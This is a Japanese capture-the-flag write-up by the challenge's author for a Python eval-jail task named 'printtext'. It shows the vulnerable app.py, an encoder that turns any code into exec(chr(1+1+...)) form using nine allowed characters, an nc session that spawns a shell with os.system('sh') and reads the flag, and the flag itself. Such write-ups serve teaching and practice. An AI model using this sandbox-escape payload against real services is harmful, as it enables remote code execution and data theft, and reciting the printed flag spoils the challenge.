# printtext💘

## 問題文
print(text)!!!!!  
`nc 160.251.76.58 54321`  
[app.py](files/app.py)  

## 難易度
**easy**  

## 作問にあたって
Pyfuck問を作りたくて出しました(参考:[Pyfuck -- Esoteric Python using only [(+travels')].](https://github.com/wanqizhu/pyfuck))。  
直前にSECCONが開催されたのですが、そこでの`hitchhike`の解法がこの問題の非想定解で慌てて修正しました。  
Proは怖いですね。  

## 解法
接続先とapp.pyが配布される。  
app.pyは以下のようであった。  
```python
import os
import sys

os.environ["PAGER"] = "cat" #No hitchhike :)

print("""            _       _    __  _            _    __
 _ __  _ __(_)_ __ | |_ / / | |_ _____  _| |_  \ \\
| '_ \| '__| | '_ \| __| |  | __/ _ \ \/ / __|  | |
| |_) | |  | | | | | |_| |  | ||  __/>  <| |_   | |
| .__/|_|  |_|_| |_|\__| |   \__\___/_/\_\\__|  | |
|_|                     \_\                    /_/

Can you evaluate `print(text)`?
They don't seem to have the flag.
""")

text = "I don't have the flag."

allow_list = input("allow_list> ")[:9]
print(f"your allow_list: {list(allow_list)}")
eval_code = input("eval_code> ")

for c in eval_code:
    if c not in allow_list:
        print(f"Hi, {c}!")
        sys.exit()

print("Let’s roll!!")
eval(eval_code)
```
9種類の文字制限で記述されたコードを`eval`しているようだ。  
配布されたソースからわかるが、`print(text)`しても、何も手に入らない。  
`os.environ["PAGER"] = "cat"`により`help()`でページャーからシェルを取得するのもブロックされている。  
ここでpythonは`chr(11+11+11+11+11+11)`などで文字`B`を作成できる。  
つまり任意の文字を`chr(1+1+...)`などで作成し、`+`で連結することで任意のコードが記述できる。  
`chr(+1)`で7文字なので、あと2文字追加できる。  
`exec`ならば`ex`の二文字を追加することで実現できる。  
これにより`exec(chr(1+1+..)+chr(1+1+..)+...)`で任意コード実行ができる。  
入力をこの形式に変換するスクリプトoreore_pyfuck.pyを以下のように記述した。  
```python
code = input()
out_f = open("output.txt", "w")
pyfuck = "exec("
pyfuck += "+".join([f"chr({'+1'*ord(c)})" for c in code])
pyfuck += ")"

for p in pyfuck:
    if p not in "exchr(+1)":
        print("Error:exchr(+1)")
        pyfuck = ""
        break

out_f.write(pyfuck)
out_f.close()
```
あとはシェルを起動する`__import__("os").system("sh")`などをこのスクリプトにかけて、出てきたものをncで送信すればよい。  
```
$ python oreore_pyfuck.py
__import__("os").system("sh")
$ (echo -e "exchr()+1\n$(cat output.txt)\n" ; cat) | nc 160.251.76.58 54321
            _       _    __  _            _    __
 _ __  _ __(_)_ __ | |_ / / | |_ _____  _| |_  \ \
| '_ \| '__| | '_ \| __| |  | __/ _ \ \/ / __|  | |
| |_) | |  | | | | | |_| |  | ||  __/>  <| |_   | |
| .__/|_|  |_|_| |_|\__| |   \__\___/_/\_\__|  | |
|_|                     \_\                    /_/

Can you evaluate `print(text)`?
They don't seem to have the flag.

allow_list> your allow_list: ['e', 'x', 'c', 'h', 'r', '(', ')', '+', '1']
eval_code> ls
app.py
flag.txt
cat flag.txt
imctf{7h3_c0d3_15_45_l0n6_45_4_py7h0n}
```
内部のファイルからflagが得られた。  

## imctf{7h3_c0d3_15_45_l0n6_45_4_py7h0n}
